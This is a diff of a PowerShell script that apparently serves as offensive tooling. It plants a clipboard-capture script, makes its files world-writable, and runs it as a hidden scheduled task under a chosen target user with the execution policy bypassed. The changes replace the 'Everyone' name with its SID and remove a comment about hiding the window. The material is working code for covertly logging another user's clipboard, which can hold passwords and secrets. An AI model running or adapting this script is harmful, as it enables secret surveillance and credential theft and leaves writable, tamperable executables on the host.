@@ -11,12 +11,12 @@ param(
 )
 
 New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null
-icacls $OutputDir /grant "Everyone:(OI)(CI)F" | Out-Null
+icacls $OutputDir /grant "*S-1-1-0:(OI)(CI)F" | Out-Null
 
 Remove-Item -Path "$OutputDir\clipboard.ps1" -Force -ErrorAction SilentlyContinue
 Remove-Item -Path "$OutputDir\clipboard.log" -Force -ErrorAction SilentlyContinue
 New-Item -Path "$OutputDir\clipboard.log" -ItemType File -Force | Out-Null
-icacls "$OutputDir\clipboard.log" /grant "Everyone:(F)" | Out-Null
+icacls "$OutputDir\clipboard.log" /grant "*S-1-1-0:(F)" | Out-Null
 
 Write-Host "[*] Creating clipboard capture script..." -ForegroundColor Cyan
 @"
@@ -59,14 +59,12 @@ while (`$elapsed -lt `$duration) {
 `$sta.Dispose()
 "[*] Clipboard capture ended at `$(Get-Date)" | Out-File `$outputFile -Append
 "@ | Set-Content -Path "$OutputDir\clipboard.ps1" -Encoding ASCII
-icacls "$OutputDir\clipboard.ps1" /grant "Everyone:(F)" | Out-Null
+icacls "$OutputDir\clipboard.ps1" /grant "*S-1-1-0:(F)" | Out-Null
 
 Write-Host "[*] Creating and starting scheduled task as $TargetUser..." -ForegroundColor Cyan
 Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
-
-# WindowStyle Hidden via la propriete Settings pour cacher la fenetre PowerShell
-$settings = New-ScheduledTaskSettingsSet -Hidden
-$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -STA -WindowStyle Hidden -File $OutputDir\clipboard.ps1" -WorkingDirectory $OutputDir
+$settings  = New-ScheduledTaskSettingsSet -Hidden
+$action    = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -STA -WindowStyle Hidden -File $OutputDir\clipboard.ps1" -WorkingDirectory $OutputDir
 $principal = New-ScheduledTaskPrincipal -UserId $TargetUser -LogonType Interactive -RunLevel Limited
 Register-ScheduledTask -TaskName $TaskName -Action $action -Principal $principal -Settings $settings -Force | Out-Null
 Start-ScheduledTask -TaskName $TaskName
